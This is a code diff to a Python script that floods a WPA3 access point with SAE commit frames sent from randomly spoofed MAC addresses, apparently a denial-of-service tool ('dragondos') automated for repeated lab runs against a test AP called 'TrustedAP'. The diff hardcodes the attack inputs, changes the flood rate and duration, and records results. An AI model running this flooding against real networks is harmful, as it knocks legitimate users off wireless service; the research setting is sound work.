@@ -70,7 +70,7 @@ def random_mac():
     rest = [random.randint(0, 255) for _ in range(5)]
     return ':'.join(f'{b:02x}' for b in [first] + rest)
 
-def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16, mac_no:int=20):
+def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10):
     global specific_frame
     """
     Send 'count' SAE commit frames from random STA MACs to the given AP MAC.
@@ -94,15 +94,21 @@ def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16, mac_no:int=20
         if src not in specific_frame:
             specific_frame[src] = time.time()
         time.sleep(1/rate)
+        
+    return int(duration/60), rate, mac_no
 
 def start_dos():
     global pwe
     #start threading
     print("which password derivation (PWE) do you want to target: (0 or 126)")
-    pwe = int(input("PWE: "))
+    #pwe = int(input("PWE: "))
+    pwe = 0
+    print("Automated input: PWE = 0")    
 
     print("which mac do you want to target (leave empty for default AP MAC): ")
-    target = input("MAC: ")
+    # target = input("MAC: ")
+    target = ""
+    print("Automated input: MAC = default")
 
     if target == "":
         ap_mac = utils.get_mac("TrustedAP")[0]
@@ -110,16 +116,16 @@ def start_dos():
         ap_mac = target
 
     #set the durations
-    duration = int(input("Duration of attack (in seconds): "))
-    rate = float(input("enter rate of frames to transmit: "))
-    mac_no = int(input("enter the number of spoofed frames to be used: "))
+    #duration = int(input("Duration of attack (in seconds): "))
+    #rate = float(input("enter rate of frames to transmit: "))
+    #mac_no = int(input("enter the number of spoofed frames to be used: "))
     threading.Thread(target=_track_cookie,daemon=True).start()
     time.sleep(1)
     og_interval = sys.getswitchinterval()
     sys.setswitchinterval(0.0005)
     stop_track.clear()
 
-    flood_sae_commits(ap_mac, duration, rate, mac_no)
+    duration, rate, mac_no = flood_sae_commits(ap_mac)
 
     sys.setswitchinterval(og_interval)
     #stop threading
@@ -130,5 +136,6 @@ def start_dos():
         pass
     tshark.communicate()
 
+    return f"sae_pwe={pwe}/dragondos_{duration}_{rate}_{mac_no}/"
 
 
